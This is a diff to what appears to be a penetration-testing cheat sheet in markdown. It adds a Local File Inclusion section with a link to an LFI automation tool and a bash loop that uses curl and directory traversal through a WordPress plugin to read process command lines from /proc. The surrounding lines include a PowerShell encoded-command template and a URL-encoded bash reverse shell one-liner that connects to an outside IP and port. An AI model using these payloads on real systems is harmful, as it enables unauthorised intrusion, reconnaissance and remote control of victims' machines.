@@ -31,6 +31,14 @@
 1. ``` powershell.exe -EncodedCommand {base64 command} ```
 
 ## Local File Inclusion LFI
+### Auto smash LFI
+- https://github.com/D35m0nd142/LFISuite 
+### For loop get linux process by LFI
+- edit the path
+- ```
+  for i in $(seq 0 2000); do echo -n "$i:"; curl google.com/wp-content/plugins/filter.php?url=../../../../../../../../../../../proc/$i/cmdline --output -;echo; done
+  ```
+
 - Header poison URL may differs from Log Poisoning 
 - TCP reverse shell one-liner
   ``` bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 ```
